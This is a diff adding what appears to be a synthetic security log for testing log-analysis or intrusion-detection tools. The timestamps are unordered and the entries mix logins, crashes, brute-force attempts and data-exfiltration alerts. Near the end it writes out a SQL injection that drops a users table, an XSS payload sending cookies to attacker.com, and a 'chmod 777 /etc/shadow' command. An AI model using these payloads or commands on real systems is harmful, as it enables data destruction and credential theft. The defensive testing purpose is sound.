@@ -1,0 +1,83 @@
+2025-06-19 04:03:28 WARNING Failed login attempt from 10.0.0.5
+2025-06-19 05:42:20 ERROR Service http crashed unexpectedly
+2025-06-19 13:24:04 ERROR Service apache crashed unexpectedly
+2025-06-19 06:05:20 INFO User carol logged in successfully from 192.168.1.100
+2025-06-19 13:09:41 ERROR Service http crashed unexpectedly
+2025-06-19 04:11:50 WARNING Failed login attempt from 192.168.1.100
+2025-06-19 13:17:24 ERROR Service ssh crashed unexpectedly
+2025-06-19 09:32:24 ERROR Service docker crashed unexpectedly
+2025-06-19 07:29:07 INFO User bob logged in successfully from 1.1.1.1
+2025-06-19 14:09:55 INFO User carol logged in successfully from 203.0.113.4
+2025-06-19 08:38:14 INFO User user logged in successfully from 1.1.1.1
+2025-06-19 10:53:40 INFO User root logged in successfully from 172.16.0.12
+2025-06-19 14:01:10 INFO User guest logged in successfully from 192.168.1.100
+2025-06-19 03:28:39 ERROR Service postgresql crashed unexpectedly
+2025-06-19 09:46:24 CRITICAL Security breach detected from 203.0.113.4
+2025-06-19 14:21:12 ERROR Service apache crashed unexpectedly
+2025-06-19 09:57:57 WARNING Failed login attempt from 10.0.0.5
+2025-06-19 09:33:16 WARNING Failed login attempt from 192.168.1.101
+2025-06-19 06:40:50 INFO User admin logged in successfully from 192.168.1.100
+2025-06-19 13:02:27 WARNING Failed login attempt from 192.168.1.100
+2025-06-19 09:38:08 INFO User alice logged in successfully from 172.16.0.12
+2025-06-19 10:59:44 CRITICAL Security breach detected from 8.8.8.8
+2025-06-19 03:31:49 WARNING Failed login attempt from 172.16.0.12
+2025-06-19 14:27:11 ERROR Service ssh crashed unexpectedly
+2025-06-19 03:38:21 CRITICAL Security breach detected from 10.0.0.5
+2025-06-19 04:36:47 ERROR Service apache crashed unexpectedly
+2025-06-19 08:52:11 WARNING Failed login attempt from 8.8.8.8
+2025-06-19 03:12:42 WARNING Failed login attempt from 203.0.113.4
+2025-06-19 11:24:28 CRITICAL Security breach detected from 203.0.113.4
+2025-06-19 05:08:15 WARNING Failed login attempt from 203.0.113.4
+2025-06-19 14:45:01 ERROR Service nginx crashed unexpectedly
+2025-06-19 13:19:01 INFO User bob logged in successfully from 192.168.1.100
+2025-06-19 06:09:02 ERROR Service ssh crashed unexpectedly
+2025-06-19 09:58:31 INFO User carol logged in successfully from 1.1.1.1
+2025-06-19 10:25:01 WARNING Failed login attempt from 8.8.8.8
+2025-06-19 10:42:25 INFO User bob logged in successfully from 192.168.1.100
+2025-06-19 04:48:36 INFO User alice logged in successfully from 203.0.113.4
+2025-06-19 07:49:13 INFO User carol logged in successfully from 172.16.0.12
+2025-06-19 06:21:43 INFO User alice logged in successfully from 192.168.1.101
+2025-06-19 14:42:03 ERROR Service apache crashed unexpectedly
+2025-06-19 06:59:00 ERROR Service postgresql crashed unexpectedly
+2025-06-19 03:36:30 ERROR Service nginx crashed unexpectedly
+2025-06-19 11:56:01 INFO User carol logged in successfully from 172.16.0.12
+2025-06-19 05:23:59 ERROR Service docker crashed unexpectedly
+2025-06-19 11:10:53 WARNING Failed login attempt from 203.0.113.4
+2025-06-19 08:54:15 CRITICAL Security breach detected from 192.168.1.100
+2025-06-19 14:05:20 WARNING Failed login attempt from 192.168.1.100
+2025-06-19 12:00:08 ERROR Service http crashed unexpectedly
+2025-06-19 05:43:36 INFO User system logged in successfully from 203.0.113.4
+2025-06-19 11:01:18 CRITICAL Security breach detected from 192.168.1.100
+2025-06-19 13:03:32 WARNING User guest executed sudo su -
+2025-06-19 04:35:20 WARNING User jenkins executed sudo chmod 777 /etc/shadow
+2025-06-19 08:06:09 INFO User alice executed sudo apt-get update
+2025-06-19 11:36:57 WARNING User root accessed sensitive file /etc/shadow from 192.168.1.50
+2025-06-19 03:07:46 WARNING User guest accessed /etc/passwd at 03:45 AM
+2025-06-19 06:37:34 WARNING User carol modified /etc/sudoers file
+2025-06-19 09:08:23 CRITICAL Large outbound data transfer: 5.2GB to 45.77.65.211 detected
+2025-06-19 13:40:11 WARNING Unusual upload pattern detected: 700MB to external FTP
+2025-06-19 04:11:00 CRITICAL Database dump (3.1GB) transferred to unknown IP 91.240.118.168
+2025-06-19 07:41:48 WARNING Connection attempt from 185.143.223.12 rejected
+2025-06-19 11:11:37 WARNING Connection attempt from 103.43.141.122 rejected
+2025-06-19 14:42:25 WARNING Connection attempt from 91.240.118.168 rejected
+2025-06-19 14:14:14 WARNING Connection attempt from 185.176.27.132 rejected
+2025-06-19 05:45:02 WARNING Connection attempt from 77.247.110.65 rejected
+2025-06-19 08:15:51 ERROR Multiple connection attempts from 185.176.27.132 to port 22
+2025-06-19 12:45:40 WARNING Failed login attempt from 10.0.0.99
+2025-06-19 03:16:28 WARNING Failed login attempt from 10.0.0.99
+2025-06-19 07:48:17 WARNING Failed login attempt from 10.0.0.99
+2025-06-19 10:19:05 WARNING Failed login attempt from 10.0.0.99
+2025-06-19 12:57:54 WARNING Failed login attempt from 10.0.0.99
+2025-06-19 05:27:42 WARNING Failed login attempt from 10.0.0.99
+2025-06-19 07:58:31 WARNING Failed login attempt from 10.0.0.99
+2025-06-19 12:30:19 WARNING Failed login attempt from 10.0.0.99
+2025-06-19 03:01:08 WARNING Blocked SQL injection attempt: ' OR 1=1; DROP TABLE users; --
+2025-06-19 06:31:56 WARNING Blocked XSS attempt: <script>document.location='http://attacker.com/cookie='+document.cookie</script>
+2025-06-19 10:01:45 WARNING Web application firewall blocked attack from 77.247.110.65
+2025-06-19 13:32:33 WARNING Failed login attempt for admin from 192.168.1.200
+2025-06-19 04:04:22 WARNING Failed login attempt for admin from 192.168.1.200
+2025-06-19 08:35:10 WARNING Failed login attempt for admin from 192.168.1.200
+2025-06-19 11:04:59 WARNING Failed login attempt for admin from 192.168.1.200
+2025-06-19 03:35:47 WARNING Failed login attempt for admin from 192.168.1.200
+2025-06-19 06:06:36 INFO User admin logged in successfully from 192.168.1.200
+2025-06-19 09:37:24 WARNING User admin executed passwd root
